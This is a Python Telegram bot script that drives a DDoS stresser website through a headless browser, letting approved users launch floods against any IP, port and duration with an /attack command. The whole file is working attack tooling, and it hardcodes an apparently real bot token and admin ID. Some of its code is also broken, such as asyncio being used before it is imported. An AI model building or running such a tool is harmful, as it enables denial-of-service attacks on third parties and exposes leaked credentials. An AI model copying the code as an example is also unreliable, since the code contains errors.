import os
import time
import json
from pathlib import Path
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from playwright.sync_api import sync_playwright

# ==================== CONFIG ====================
BOT_TOKEN = "8521144614:AAHFv7ZbSzwklQwaRznTGKCeCzyGMZtZbQg"
ADMIN_ID = 7820814565

# Website URLs
LOGIN_URL = "https://satellitestress.st/login"
ATTACK_URL = "https://satellitestress.st/attack"
COOKIES_FILE = Path("cookies.json")

# Login success detection
SUCCESS_URL_PART = "/attack"
HEADLESS_AFTER_LOGIN = True

# ==================== GLOBALS ====================
approved_users = {}
is_attack_running = False
attack_end_time = 0
current_target = ""
browser = None
context = None
page = None

# Auto-approve admin
approved_users[ADMIN_ID] = time.time() + (365 * 86400)

# ==================== COOKIE FUNCTIONS ====================
def save_cookies(ctx):
    cookies = ctx.cookies()
    COOKIES_FILE.write_text(json.dumps(cookies, indent=2))
    print(f"✅ Cookies saved: {COOKIES_FILE}")

def load_cookies(ctx):
    if not COOKIES_FILE.exists():
        return False
    cookies = json.loads(COOKIES_FILE.read_text())
    ctx.add_cookies(cookies)
    print("✅ Cookies loaded")
    return True

def is_logged_in(p):
    if SUCCESS_URL_PART and SUCCESS_URL_PART in p.url:
        return True
    return False

# ==================== BROWSER SETUP ====================
def init_browser(headless=True):
    global browser, context, page
    try:
        p = sync_playwright().start()
        browser = p.firefox.launch(headless=headless)
        context = browser.new_context()
        
        # Try to load cookies
        cookies_loaded = load_cookies(context)
        
        page = context.new_page()
        
        if cookies_loaded:
            # Test if cookies work
            page.goto(ATTACK_URL, timeout=30000)
            if is_logged_in(page):
                print("✅ Session valid!")
                return True
            else:
                print("⚠️ Cookies expired")
                return False
        else:
            print("📁 No cookies found")
            return False
            
    except Exception as e:
        print(f"❌ Browser error: {e}")
        return False

def close_browser():
    global browser, context, page
    try:
        if browser:
            browser.close()
    except:
        pass

# ==================== MANUAL LOGIN ====================
def manual_login():
    global browser, context, page
    
    print("🔐 Starting manual login...")
    
    p = sync_playwright().start()
    browser = p.firefox.launch(headless=False)
    context = browser.new_context()
    page = context.new_page()
    
    page.goto(LOGIN_URL)
    
    print("✅ Browser opened. Please login manually.")
    input("⏎ Press ENTER after login...")
    
    page.goto(ATTACK_URL)
    
    if is_logged_in(page):
        save_cookies(context)
        print("✅ Session saved!")
        return True
    else:
        print("❌ Login failed")
        browser.close()
        return False

# ==================== TELEGRAM COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ **ATTACK BOT** ⚡\n\n"
        "Commands:\n"
        "/attack <ip> <port> <time>\n"
        "/myid\n"
        "/status"
    )

async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(f"Your ID: `{user_id}`")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if page and is_logged_in(page):
        await update.message.reply_text("✅ Bot ready with valid session!")
    else:
        await update.message.reply_text("❌ Session expired. Admin needs to login.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, attack_end_time, current_target, page
    
    user_id = update.effective_user.id
    
    # Check approval
    if user_id not in approved_users:
        await update.message.reply_text("❌ Not approved. Contact admin.")
        return
    
    if time.time() > approved_users[user_id]:
        await update.message.reply_text("❌ Your access expired.")
        return
    
    # Check if attack running
    if is_attack_running:
        remaining = attack_end_time - time.time()
        if remaining > 0:
            await update.message.reply_text(f"⚠️ Attack running. Wait {int(remaining)}s")
            return
    
    # Parse args
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    
    ip, port_str, time_str = args
    
    try:
        port = int(port_str)
        duration = int(time_str)
        if duration < 10 or duration > 300:
            await update.message.reply_text("❌ Time must be 10-300 seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid numbers")
        return
    
    # Check page/session
    if not page or not is_logged_in(page):
        await update.message.reply_text("❌ Session expired. Admin needs to login with /login")
        return
    
    # Start attack
    is_attack_running = True
    attack_end_time = time.time() + duration
    current_target = f"{ip}:{port}"
    
    msg = await update.message.reply_text(f"🔄 Attacking {ip}:{port} for {duration}s...")
    
    try:
        # Go to attack page
        page.goto(ATTACK_URL, timeout=30000)
        time.sleep(2)
        
        # Find inputs
        inputs = page.locator('input[type="text"]').all()
        
        if len(inputs) >= 3:
            inputs[0].fill('')
            inputs[0].fill(ip)
            inputs[1].fill('')
            inputs[1].fill(port_str)
            inputs[2].fill('')
            inputs[2].fill(time_str)
            
            # Click launch
            launch_btn = page.locator('button:has-text("Launch")')
            if launch_btn.count() > 0:
                launch_btn.first.click()
                await msg.edit_text(f"✅ **Attack launched!**\n{ip}:{port} for {duration}s")
                
                # Wait for duration
                time.sleep(duration)
                await update.message.reply_text("✅ Attack completed!")
            else:
                await msg.edit_text("❌ Launch button not found")
        else:
            await msg.edit_text(f"❌ Only {len(inputs)} inputs found")
            
    except Exception as e:
        await msg.edit_text(f"❌ Attack error: {e}")
    finally:
        is_attack_running = False
        current_target = ""

# ==================== ADMIN LOGIN COMMAND ====================
async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only")
        return
    
    await update.message.reply_text("🔐 Starting login process...")
    
    # Run manual login in thread
    def login_thread():
        success = manual_login()
        if success:
            asyncio.run_coroutine_threadsafe(
                update.message.reply_text("✅ Login successful! Bot ready."),
                asyncio.get_event_loop()
            )
        else:
            asyncio.run_coroutine_threadsafe(
                update.message.reply_text("❌ Login failed"),
                asyncio.get_event_loop()
            )
    
    import threading
    threading.Thread(target=login_thread).start()

# ==================== MAIN ====================
def main():
    print("="*60)
    print("🤖 MRX COOKIE BOT STARTING...")
    print("="*60)
    
    # Try to load session
    session_valid = init_browser(headless=True)
    
    if not session_valid:
        print("\n⚠️ No valid session found.")
        print("Admin must use /login command to login manually.\n")
    
    # Start bot
    import asyncio
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CommandHandler("attack", attack))
    
    print("✅ Bot is running!")
    print("="*60)
    app.run_polling()

if __name__ == "__main__":
    main()
